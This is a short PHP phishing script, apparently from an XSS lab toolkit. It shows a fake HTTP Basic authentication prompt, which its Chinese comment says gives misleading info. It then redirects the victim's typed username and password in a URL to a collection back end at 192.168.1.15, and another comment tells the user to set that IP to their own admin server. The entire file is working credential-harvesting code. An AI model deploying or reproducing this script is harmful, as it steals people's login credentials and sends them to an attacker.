<?php
error_reporting(0);
// var_dump($_SERVER);
if ((!isset($_SERVER['PHP_AUTH_USER'])) || (!isset($_SERVER['PHP_AUTH_PW']))) {
//发送认证框，并给出迷惑性的info
    header('Content-type:text/html;charset=utf-8');
    header("WWW-Authenticate: Basic realm='认证'");
    header('HTTP/1.0 401 Unauthorized');
    echo 'Authorization Required.';
    exit;
} else if ((isset($_SERVER['PHP_AUTH_USER'])) && (isset($_SERVER['PHP_AUTH_PW']))){
//将结果发送给搜集信息的后台,请将这里的IP地址修改为管理后台的IP
    header("Location: http://192.168.1.15/pkxss/xfish/xfish.php?username={$_SERVER[PHP_AUTH_USER]}
    &password={$_SERVER[PHP_AUTH_PW]}");
}

?>